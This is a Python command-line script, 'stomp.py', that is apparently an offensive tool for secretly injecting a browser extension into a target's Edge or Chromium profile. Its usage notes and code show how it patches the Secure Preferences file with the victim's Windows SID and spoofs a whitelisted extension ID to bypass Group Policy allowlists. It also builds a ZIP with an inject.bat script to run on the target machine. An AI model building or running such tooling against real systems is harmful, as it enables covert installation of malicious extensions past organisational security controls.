#!/usr/bin/env python3
"""
stomp.py  –  Browser Extension Injection Tool
 
Usage
-----
# Basic injection (fresh random ID)
python3 stomp.py EXTENSION_DIR/ \
    --prefs-file SecurePreferences \
    --device-id "S-1-5-21-...-...-...-..." \
    --target-dir "C:\\Users\\USER\\AppData\\Local" \
    --browser edge
 
# GPO bypass – spoof a whitelisted extension ID
python3 stomp.py EXTENSION_DIR/ \
    --spoof nmhdhpibnnopknkmonacoephklnflpho \
    --prefs-file SecurePreferences \
    --device-id "S-1-5-21-...-...-...-..." \
    --target-dir "C:\\Users\\USER\\AppData\\Local" \
    --browser edge

# GPO bypass with proxy (if behind corporate proxy)
python3 stomp.py EXTENSION_DIR/ \
    --spoof nmhdhpibnnopknkmonacoephklnflpho \
    --prefs-file SecurePreferences \
    --device-id "S-1-5-21-...-...-...-..." \
    --target-dir "C:\\Users\\USER\\AppData\\Local" \
    --proxy http://proxy.corp.com:8080 \
    --browser edge
 
Output ZIP layout
-----------------
output.zip
    - extension/              <- extension folder, ready to copy on target
    - info.json               <- metadata (ID, paths, browser)
    - inject.bat              <- automated deployment script
    - SecurePreferencesClean  <- backup of the original Secure Preferences
    - Secure Preferences      <- patched file, ready to drop on target
"""


import argparse
import sys
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
# Local modules
from utils.browser_config import BrowserConfigurator
from utils.manifest import get_public_key_for_id, patch_manifest
from utils.package import package

# CLI
def main() -> None:
    parser = argparse.ArgumentParser(
        description="stomp.py – Browser Extension Injection / ID Spoofing Tool",
    )
    parser.add_argument(
        "extension_dir",
        help="Local extension folder (must contain manifest.json)",
    )
    parser.add_argument(
        "--spoof",
        metavar="EXTENSION_ID",
        default=None,
        help="Extension ID to spoof (fetches its public key from the store)",
    )
    parser.add_argument("--prefs-file", required=True,
                        help="Path to the target Secure Preferences file")
    parser.add_argument("--device-id", required=True,
                        help="Target user's Windows SID or hardware UUID for Linux/macOS")
    parser.add_argument("--target-dir", required=True,
                        help=r"Deployment root on target (e.g. C:\Users\X\AppData\Local)")
    parser.add_argument("--platform",
                        choices=["windows", "linux", "darwin"],
                        default="windows",
                        help="Target platform (default: windows)"
    )
    parser.add_argument("--browser",
                        choices=list(BrowserConfigurator.get_browser_configs().keys()),
                        default="edge",
                        help="Target browser (default: edge)"
    )
    parser.add_argument("--proxy",
                        default=None,
                        help="HTTP/HTTPS proxy URL (e.g. http://proxy.corp.com:8080) for fetching the CRX from the store")
    parser.add_argument("--output", default=None,
                        help="Output directory for the deployment ZIP (default: current directory)")
    parser.add_argument("--debug", action="store_true",
                        help="Enable verbose debug output")
    args = parser.parse_args()
 
    print(f"\n{'='*60}")
    print("  stomp.py  –  Extension Injection Tool")
    print(f"{'='*60}\n")


    # Step 1 & 2: optional ID spoofing
    if args.spoof:
        print(f"[1/3] Fetching public key for {args.spoof}")
        pub_key = get_public_key_for_id(args.spoof, args.browser, proxy=args.proxy)
        if not pub_key:
            print("[-] Could not retrieve public key – aborting.")
            sys.exit(1)
 
        print(f"\n[2/3] Patching manifest in {args.extension_dir}")
        if not patch_manifest(args.extension_dir, pub_key):
            print("[-] Manifest patch failed – aborting.")
            sys.exit(1)
    else:
        print("[1/3] Spoofing disabled – keeping extension ID")
        print("[2/3] Skipped")


    # Step 3: build deployment package
    print(f"\n[3/3] Building deployment package …")
    result = package(
        extension_dir=args.extension_dir,
        prefs_file=args.prefs_file,
        device_id=args.device_id,
        target_dir=args.target_dir,
        platform=args.platform,
        browser_id=args.browser,
        output_dir=args.output,
        debug=args.debug,
    )
 
    if not result:
        print("\n[-] Package creation failed.")
        sys.exit(1)
 
    print("\n[+] Done.")
    if args.platform == "windows":
        print("[*] Extract the _deploy.zip on the target machine and run inject.bat")
    else:
        print("[*] Extract the _deploy.zip on the target machine and run inject.sh")



if __name__ == "__main__":
    main()
